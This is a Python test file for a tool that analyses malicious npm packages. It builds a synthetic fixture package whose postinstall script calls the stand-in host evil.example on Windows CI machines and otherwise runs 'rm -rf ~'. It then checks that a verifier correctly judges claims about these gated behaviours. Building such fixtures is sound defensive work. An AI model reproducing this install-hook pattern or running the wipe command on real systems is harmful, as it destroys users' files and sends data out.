import copy
import json

from tools.analysis import prepare, write_report
from tools.common import contract
from tools.tests.helpers import cite, drop_uncited, sample, tgz
from tools.verify import verify
from tools.verify.source import sample_index

INDEX = """
const os = require('os');
const cp = require('child_process');
const https = require('https');
function steal() { https.get('https://evil.example/x'); }
function wipe() { cp.exec('rm -rf ~'); }
if (os.platform() === 'win32' && process.env.CI) {
  steal();
} else {
  wipe();
}
"""


def build(repo, index=INDEX, name="two-way"):
    files = {"package.json": json.dumps({"name": name, "version": "1.0.0", "scripts": {"postinstall": "node index.js"}}),
             "index.js": index}
    res = prepare.prepare(sample(repo, f"datadog/npm/malicious_intent/{name}.tgz", tgz(files)), None, None)
    work = repo / "scratch" / res["key"]
    rec = json.loads((work / "record.json").read_text())
    by_api = {c["api"]: c for c in rec["conditions"]}
    c1, c2 = by_api["os.platform()"], by_api["process.env.CI"]
    c1["id"], c2["id"] = "c1", "c2"
    rec["conditions"] = [c1, c2]

    def path(fn, call_line, sink_text, def_line, behaviour, kind):
        return {"behaviour": behaviour, "sink_kind": kind, "sink": cite(work, "index.js", def_line, sink_text),
                "witness": [{"hop": "call", "anchor": cite(work, "index.js", call_line, f"{fn}()")},
                            {"hop": "def", "anchor": cite(work, "index.js", def_line, f"function {fn}()",
                                                          node_type="function_declaration")}]}
    rec["gates"] = [{
        "gate_id": "g1", "hook": "postinstall", "expression": "c1 && c2", "provenance": "out_of_set",
        "guards": [{"candidate": None, "kind": "if", "arm": "then", "conditions": ["c1", "c2"],
                    "site": cite(work, "index.js", 7, "if (os.platform()", node_type="if_statement")}],
        "polarity": "activate", "effect": "selects", "purpose": "targeting", "purpose_reason": "x",
        "then": {"min_conditions": 2, "behaviours": ["exfil"], "env_recipe": {}, "recipe_guessed_fields": [],
                 "regions": [cite(work, "index.js", 7, "{\n  steal();\n}", node_type="statement_block")],
                 "payload": [path("steal", 8, "https.get('https://evil.example/x')", 5, "exfil", "network")]},
        "else": {"min_conditions": 1, "behaviours": ["destructive"], "env_recipe": {}, "recipe_guessed_fields": [],
                 "regions": [cite(work, "index.js", 9, "{\n  wipe();\n}", node_type="statement_block")],
                 "payload": [path("wipe", 10, "cp.exec('rm -rf ~')", 6, "destructive", "exec")]}}]
    rec.update(requirements=[], behaviours={"ungated": [], "gated": ["exfil", "destructive"]},
               obfuscation={"level": "none", "techniques": [], "decoded": None, "unrecovered": []},
               reachability={"needs_remote": True, "endpoints": []}, attack_type="unknown", family_hint=None,
               claude_assessment="malicious", assessment_reason="x", confidence="high", needs_manual_review=True)
    rec["package"]["model_name"] = "claude-test"
    drop_uncited(work, rec)
    (work / "record.json").write_text(json.dumps(rec))
    (work / "summary.md").write_text("## Summary\n\nx\n\n## Notes\n\nx\n")
    return contract.read_record(write_report.finish(work))


def verdicts(rec):
    return {v["claim_id"]: v for v in verify.verdicts_for(rec, sample_index())}


def test_a_correct_two_way_gate_verifies(repo):
    v = verdicts(build(repo))
    for cid in ("c1.L1", "c1.L2", "c2.L1", "c2.L2", "g1.then.L3", "g1.else.L3", "g1.L4", "g1.then.L5", "g1.else.L5"):
        assert v[cid]["verdict"] == "verified", (cid, v[cid])
    assert v["g1.then.L3.excl"]["grade"] == "exclusive" and v["g1.L4"]["grade"] == "consistent"


def test_wrong_arm_combination_and_sink_kind_are_refuted(repo):
    rec = build(repo)
    arm = copy.deepcopy(rec)
    arm["gates"][0]["guards"][0]["arm"] = "else"
    assert verdicts(arm)["g1.then.L3"]["reason_code"] == "outside_region"
    either = copy.deepcopy(rec)
    either["gates"][0]["expression"] = "c1 || c2"
    v = verdicts(either)["g1.L4"]
    assert v["verdict"] == "refuted" and v["grade"] == "inconsistent"
    kind = copy.deepcopy(rec)
    kind["gates"][0]["then"]["payload"][0]["sink_kind"] = "exec"
    assert verdicts(kind)["g1.then.L5"]["reason_code"] == "sink_kind_mismatch"
    hop = copy.deepcopy(rec)
    hop["gates"][0]["then"]["payload"][0]["witness"][1] = rec["gates"][0]["else"]["payload"][0]["witness"][1]
    assert verdicts(hop)["g1.then.L3"]["verdict"] in ("refuted", "cannot_tell")


def test_an_unguarded_second_call_breaks_exclusivity(repo):
    v = verdicts(build(repo, INDEX + "steal();\n", name="leaky"))
    assert v["g1.then.L3"]["verdict"] == "verified"
    assert v["g1.then.L3.excl"]["grade"] == "non_exclusive" and v["g1.then.L3.excl"]["verdict"] == "refuted"
    assert v["g1.else.L3.excl"]["grade"] == "exclusive"


def test_early_exit_gate_on_the_npm_fixture(repo):
    from tools.tests.helpers import NPM, complete
    res = prepare.prepare(sample(repo, "datadog/npm/malicious_intent/demo.tgz", tgz(NPM)), None, None)
    work = repo / "scratch" / res["key"]
    complete(work)
    rec = contract.read_record(write_report.finish(work))
    rec["gates"][0]["guards"][0]["conditions"] = ["c1"]
    rec["gates"][0]["expression"] = "c1"
    assert verdicts(rec)["g1.L4"]["reason_code"] == "expression_mismatch"  # min_conditions still says 2
    rec["gates"][0]["then"]["min_conditions"] = 1
    v = verdicts(rec)
    assert v["g1.then.L3"]["verdict"] == "verified", v["g1.then.L3"]  # util.send() after the exit, into util.js
    assert v["g1.L4"]["verdict"] == "verified" and v["g1.then.L5"]["verdict"] == "verified"
